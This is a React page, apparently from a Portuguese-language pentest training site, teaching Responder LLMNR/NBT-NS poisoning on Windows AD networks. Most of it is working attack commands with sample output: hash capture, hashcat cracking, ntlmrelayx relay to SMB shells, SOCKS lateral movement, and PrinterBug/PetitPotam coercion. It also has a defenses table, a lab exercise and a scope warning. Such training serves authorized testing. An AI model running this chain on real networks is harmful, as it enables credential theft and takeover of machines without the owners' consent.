import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { OutputBlock } from "@/components/ui/OutputBlock";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Responder() {
  return (
    <PageContainer
      title="Responder — LLMNR / NBT-NS / mDNS poisoning"
      subtitle="Captura hashes NetNTLMv2 em LANs Windows envenenando broadcast de resolução de nomes."
      difficulty="avancado"
      timeToRead="14 min"
      prompt="ad/responder"
    >
      <h2>Como funciona</h2>
      <p>
        Quando um host Windows tenta resolver um nome que <strong>NÃO existe no DNS</strong>
        (typo, share antigo, etc.), ele faz broadcast LLMNR/NBT-NS perguntando "quem é
        <code> server01</code>?". O Responder responde "sou eu!" e o cliente Windows envia
        automaticamente seu <strong>NetNTLMv2 hash</strong> para autenticar. Hash → crackeável
        offline com hashcat, ou usado em relay (ntlmrelayx) para tomar máquinas inteiras.
      </p>

      <h2>Setup</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo apt install -y responder",
            out: `Reading package lists... Done
responder is already the newest version (3.1.5.0-0kali1).
0 upgraded, 0 newly installed, 0 to remove.`,
            outType: "muted",
          },
          {
            cmd: "responder --version",
            out: `Responder 3.1.5.0`,
            outType: "info",
          },
          {
            comment: "config principal — desligar SMB/HTTP se for usar ntlmrelayx",
            cmd: "sudo nano /usr/share/responder/Responder.conf",
            out: `[Responder Core]
SQL = On
SMB = On
RDP = On
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = On      ← desligar se relay
HTTPS = On
DNS = On
LDAP = On
MQTT = On
WINRM = On
DCERPC = On

Challenge = 1122334455667788
[...]`,
            outType: "default",
          },
        ]}
      />

      <h2>Modo passivo — só ouvir/analisar</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo responder -I eth0 -A",
            out: `                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

         NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)

[+] Poisoners:
    LLMNR                      [OFF]
    NBT-NS                     [OFF]
    MDNS                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    SMB server                 [ON]
    Kerberos server            [ON]
    [...]

[+] Listening for events...

[Analyze mode] LLMNR poisoned answer sent to 192.168.50.45 for name 'server01'
[Analyze mode] NBT-NS Name : 'PRINTER01' (service: File Server)
[Analyze mode] LLMNR poisoned answer sent to 192.168.50.45 for name 'wpad'
[Analyze mode] LLMNR poisoned answer sent to 192.168.50.50 for name 'tlserver'
(192.168.50.45) New WPAD request                                ← rede VULN!`,
            outType: "info",
          },
        ]}
      />

      <h2>Modo ativo — captura hashes</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo responder -I eth0 -wrf",
            out: `[+] Poisoners:
    LLMNR                      [ON]    ← responde LLMNR
    NBT-NS                     [ON]    ← responde NetBIOS
    MDNS                       [ON]    ← responde mDNS

[+] Listening for events...

[*] [LLMNR]  Poisoned answer sent to 192.168.50.45 for name server01
[*] [NBT-NS] Poisoned answer sent to 192.168.50.50 for name FILESVR (service: File Server)

[SMB] NTLMv2-SSP Client    : 192.168.50.45
[SMB] NTLMv2-SSP Username  : EMPRESA\\ana
[SMB] NTLMv2-SSP Hash      : ana::EMPRESA:1122334455667788:9F1B7E4C2A8D3F6E5B7C9D0A1F2E3D4C:0101000000000000C0653150DE09D201D0F8FD0E2BA7E5BC0000000002000A00530056003000310053002E0001001E00570049004E002D0050003900360053005000510044004F005400440004001E00570049004E002D0050003900360053005000510044004F00540044005F0008003000300000000000000000000000004000000F4DCC0C9B5E2D7A4F1B9E0C3D4A5F6E7B8...

[*] [LLMNR]  Poisoned answer sent to 192.168.50.45 for name wpad

[HTTP] NTLMv2 Client        : 192.168.50.50
[HTTP] NTLMv2 Username      : EMPRESA\\joao
[HTTP] NTLMv2 Hash          : joao::EMPRESA:1122334455667788:8E2C9A...

[*] Skipping previously captured hash for EMPRESA\\ana`,
            outType: "warning",
          },
        ]}
      />

      <CommandTable
        title="Flags principais"
        variations={[
          { cmd: "-I eth0", desc: "Interface alvo.", output: "Pode ser tun0/wlan0." },
          { cmd: "-A", desc: "Analyze mode (não responde, só observa).", output: "Para mapeamento sem detecção." },
          { cmd: "-w", desc: "Habilita WPAD proxy (captura HTTP auth).", output: "Pega navegadores corporativos." },
          { cmd: "-r", desc: "Habilita NetBIOS broadcast (workgroup answer).", output: "Pode causar conflito de nomes." },
          { cmd: "-f", desc: "Fingerprint cada vítima.", output: "Mostra OS/versão." },
          { cmd: "-d", desc: "DHCP poisoning (avançado).", output: "Substitui gateway." },
          { cmd: "-v", desc: "Verbose (todos os pacotes).", output: "Para debug." },
          { cmd: "-F", desc: "Força basic auth (popup HTTP) em vez de NTLM.", output: "Pega senhas em texto puro." },
          { cmd: "-P", desc: "Força proxy auth.", output: "Igual -F mas via WPAD." },
        ]}
      />

      <h2>Onde os hashes vão</h2>
      <Terminal
        path="~"
        lines={[
          {
            cmd: "sudo ls -la /usr/share/responder/logs/",
            out: `total 84
drwxr-xr-x 2 root root  4096 Apr  3 21:42 .
drwxr-xr-x 9 root root  4096 Apr  3 21:42 ..
-rw-r--r-- 1 root root  1842 Apr  3 21:42 SMB-NTLMv2-SSP-192.168.50.45.txt
-rw-r--r-- 1 root root  1842 Apr  3 21:42 SMB-NTLMv2-SSP-192.168.50.50.txt
-rw-r--r-- 1 root root  1631 Apr  3 21:43 HTTP-NTLMv2-192.168.50.50.txt
-rw-r--r-- 1 root root 14729 Apr  3 21:43 Responder-Session.log
-rw-r--r-- 1 root root  4421 Apr  3 21:43 Analyzer-Session.log`,
            outType: "info",
          },
          {
            cmd: "sudo cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.50.45.txt",
            out: `ana::EMPRESA:1122334455667788:9F1B7E4C2A8D3F6E5B7C9D0A1F2E3D4C:0101000000000000C0653150DE09D201D0F8FD0E2BA7E5BC0000000002000A00530056003000310053002E0001001E00570049004E002D0050003900360053005000510044004F005400440004001E00570049004E002D0050003900360053005000510044004F00540044005F0008003000300000000000000000000000004000000F4DCC0C9B5E2D7A4F1B9E0C3D4A5F6E7B8...`,
            outType: "default",
          },
        ]}
      />

      <h2>Crackear NetNTLMv2 com hashcat</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "modo 5600 = NetNTLMv2",
            cmd: "hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.50.45.txt /usr/share/wordlists/rockyou.txt -O",
            out: `hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 CUDA 12.4) - Platform #1 [NVIDIA Corporation]
* Device #1: NVIDIA GeForce RTX 4090, 23842/24564 MB, 128MCU

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries

ANA::EMPRESA:1122334455667788:9F1B7E4C2A8D3F6E5B7C9D0A1F2E3D4C:01010000...:Empresa@2025!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Recovered........: 1/1 (100.00%) Digests
Speed.#1.........:  4.241 GH/s

Started: Wed Apr  3 21:51:14 2026
Stopped: Wed Apr  3 21:51:18 2026`,
            outType: "success",
          },
        ]}
      />

      <h2>NTLM relay (sem crackear) — ntlmrelayx</h2>
      <p>
        Em vez de capturar e crackear, você pode <strong>relay</strong> a autenticação para
        OUTRO host onde o user tem privilégio. Resultado: shell instantânea sem nem ver o hash.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            comment: "PRECONDIÇÃO: SMB signing OFF nos targets (não obrigatório)",
            cmd: "crackmapexec smb 192.168.50.0/24 --gen-relay-list relay_targets.txt",
            out: `SMB  192.168.50.10  445  DC01     [*] Windows 10 (signing:True)
SMB  192.168.50.20  445  WS-RH    [*] Windows 10 (signing:False)   ← target!
SMB  192.168.50.21  445  WS-FIN   [*] Windows 10 (signing:False)   ← target!
SMB  192.168.50.30  445  FILE-01  [*] Windows Server (signing:True)`,
            outType: "warning",
          },
          {
            comment: "1) desabilitar SMB/HTTP no Responder.conf (senão dá conflito)",
            cmd: "sudo sed -i 's/^SMB = On/SMB = Off/; s/^HTTP = On/HTTP = Off/' /usr/share/responder/Responder.conf",
            out: "(silencioso)",
            outType: "muted",
          },
          {
            comment: "2) terminal A — ntlmrelayx para fazer o relay",
            cmd: "sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support -i",
            out: `Impacket v0.11.0 - Copyright 2023 Fortra

[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client IMAP loaded..

[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Servers started, waiting for connections`,
            outType: "info",
          },
          {
            comment: "3) terminal B — Responder envenena (SMB e HTTP DESLIGADOS lá)",
            cmd: "sudo responder -I eth0 -wrf",
            out: "(envenena LLMNR/NBT-NS, encaminha auth pra ntlmrelayx)",
            outType: "muted",
          },
          {
            comment: "4) qualquer Win client tentar resolver nome estranho → relay → shell!",
            cmd: "(no terminal A, ntlmrelayx)",
            out: `[*] SMBD-Thread-3: Connection from EMPRESA/ANA@192.168.50.45 controlled, attacking target smb://192.168.50.20

[*] Authenticating against smb://192.168.50.20 as EMPRESA/ANA SUCCEED   ← admin local!
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
[*] Authenticating against smb://192.168.50.21 as EMPRESA/ANA SUCCEED   ← admin local!
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11001`,
            outType: "error",
          },
          {
            cmd: "nc 127.0.0.1 11000",
            out: `Type help for list of commands
# shares
ADMIN$
C$
IPC$

# use C$
# ls
drwxrwxrwx          0  Wed Apr  3 21:14:21 2026 .
drwxrwxrwx          0  Wed Apr  3 21:14:21 2026 ..
drwxrwxrwx          0  Wed Mar 19 14:02:03 2026 Users
drwxrwxrwx          0  Wed Mar 19 14:02:03 2026 Windows`,
            outType: "warning",
          },
        ]}
      />

      <h2>SOCKS proxy + lateral movement</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "ntlmrelayx em modo socks — abre proxy 1080 com TODAS as creds capturadas",
            cmd: "sudo impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks",
            out: `[*] SOCKS proxy listening on 0.0.0.0:1080

[*] SOCKS: Adding ANA@192.168.50.20  (admin = True)
[*] SOCKS: Adding ANA@192.168.50.21  (admin = True)
[*] SOCKS: Adding JOAO@192.168.50.10 (admin = False)`,
            outType: "info",
          },
          {
            cmd: "proxychains -q crackmapexec smb 192.168.50.20 -u ana -p '' --shares",
            out: `SMB  192.168.50.20  445  WS-RH  [*] Windows 10 x64
SMB  192.168.50.20  445  WS-RH  [+] EMPRESA\\ana (Pwn3d!)
SMB  192.168.50.20  445  WS-RH  [+] Enumerated shares
SMB  192.168.50.20  445  WS-RH    Share           Permissions
SMB  192.168.50.20  445  WS-RH    -----           -----------
SMB  192.168.50.20  445  WS-RH    ADMIN$          READ,WRITE
SMB  192.168.50.20  445  WS-RH    C$              READ,WRITE
SMB  192.168.50.20  445  WS-RH    IPC$            READ`,
            outType: "warning",
          },
        ]}
      />

      <h2>Forçar autenticação (sem esperar)</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "se você ja tem creds de QUALQUER user, pode coagir o DC a autenticar",
            cmd: "impacket-printerbug 'EMPRESA/ana:Senha2025'@dc01.empresa.local 192.168.50.107",
            out: `Impacket v0.11.0
[*] Attempting to trigger authentication via rprn RPC at dc01.empresa.local
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Triggered RPC backconnect, this may or may not have worked
(no Responder/ntlmrelayx aparece o auth do DC$ → relay para LDAP do AD = WIN!)`,
            outType: "error",
          },
          {
            comment: "PetitPotam (CVE-2021-36942) — funciona em quase todo Windows",
            cmd: "impacket-petitpotam 192.168.50.107 dc01.empresa.local",
            out: `[*] Connecting to ncacn_np:dc01.empresa.local[\\PIPE\\efsrpc]
[+] Successfully bound!
[+] Triggering authentication coercion via EfsRpcOpenFileRaw
[+] DC will authenticate to attacker (192.168.50.107)`,
            outType: "error",
          },
        ]}
      />

      <h2>Conditions defeats</h2>
      <CommandTable
        title="O que MATA o Responder em rede madura"
        variations={[
          { cmd: "LLMNR/NBT-NS desabilitados", desc: "Group Policy: 'Turn off multicast name resolution'.", output: "Sem broadcast = sem hash." },
          { cmd: "SMB signing required", desc: "Default em DCs modernos.", output: "Relay para SMB falha." },
          { cmd: "Extended Protection (HTTPS)", desc: "Bind canal TLS ao auth.", output: "Relay HTTPS falha." },
          { cmd: "MFA em qualquer auth", desc: "NTLM bypass impossível.", output: "Mata o jogo de relay todo." },
          { cmd: "Network segmentation", desc: "Pentester em VLAN diferente.", output: "Não vê broadcast LLMNR." },
          { cmd: "Defender for Identity", desc: "Detecta padrões de envenenamento.", output: "Alerta SOC em segundos." },
        ]}
      />

      <PracticeBox
        title="Lab: Responder + Win10 num host-only"
        goal="Capturar hash NetNTLMv2 e crackear localmente."
        steps={[
          "VirtualBox: Kali + Win10 em mesma rede host-only.",
          "Responder no Kali em -wrf -A primeiro (modo passivo) → veja envenenadores.",
          "Repita SEM -A (envenena de fato).",
          "Na Win10: Explorer → digite '\\\\server-falso' → Enter.",
          "Hash captura no Responder. Cracke com hashcat -m 5600 + rockyou.",
        ]}
        command={`# Kali
sudo responder -I eth1 -wrf

# Win10 (cmd):
\\\\nonexistenthost-XYZ

# (de volta no Kali, hash apareceu)
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-*.txt \\
  /usr/share/wordlists/rockyou.txt -O`}
        expected={`[SMB] NTLMv2-SSP Hash : Win10User::DESKTOP-ABC:1122...

(hashcat)
WIN10USER::DESKTOP-ABC:1122334455667788:...:senha123_do_lab`}
        verify="Restaure o snapshot da VM Win10 depois — Responder pode deixar log no system event 4625 da máquina."
      />

      <AlertBox type="danger" title="Ferramenta de pentest interno — apenas com escopo">
        Responder é a ferramenta mais útil em pentest interno de Windows AD — também é
        criminosa fora dele. NUNCA rode em rede de cliente sem cláusula explícita de
        "interception of network broadcasts" no contrato.
      </AlertBox>
    </PageContainer>
  );
}
